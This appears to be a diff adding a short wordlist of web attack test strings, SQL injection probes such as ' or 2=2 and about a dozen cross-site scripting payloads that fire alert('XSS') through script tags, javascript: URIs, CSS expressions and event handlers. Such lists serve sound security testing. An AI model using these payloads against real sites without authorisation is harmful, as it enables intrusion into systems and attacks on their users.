@@ -1,0 +1,15 @@
+' or 2=2
+" or 202
+"
+'
+<script>alert('XSS');</script>
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+ <font style='color:expression(alert('XSS'))'>
+'); alert('XSS
+<img src="javascript:alert('XSS')">
+<body onunload="javascript:alert('XSS');"> 
+<body onLoad="alert('XSS');"
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BASE HREF="javascript:alert('XSS');//">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
